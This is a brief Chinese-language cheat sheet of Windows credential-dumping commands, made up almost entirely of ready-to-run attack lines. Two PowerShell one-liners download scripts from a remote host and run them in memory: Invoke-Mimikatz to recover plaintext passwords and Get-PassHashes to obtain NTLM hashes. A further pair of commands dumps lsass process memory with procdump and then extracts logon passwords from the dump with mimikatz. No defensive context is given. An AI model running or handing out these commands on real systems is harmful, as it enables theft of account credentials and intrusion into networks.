#### 0x01 mimikatz远程执行获取明文密码

```sh
powershell iex (new-object system.net.webclient).downloadstring('http://10.0.0.213:8000/Invoke-Mimikatz.ps1');invoke-mimikatz -DumpCreds
```

<br/>

#### 0x02  获取NTLM-hash

```sh
powershell iex(new-object system.net.webclient).downloadstring('http://10.0.0.213:8000/Get-PassHashes.ps1.txt');Get-PassHashes
```

<br/>

#### 0x03 dump进程获取密码

```sh
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

```sh
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
```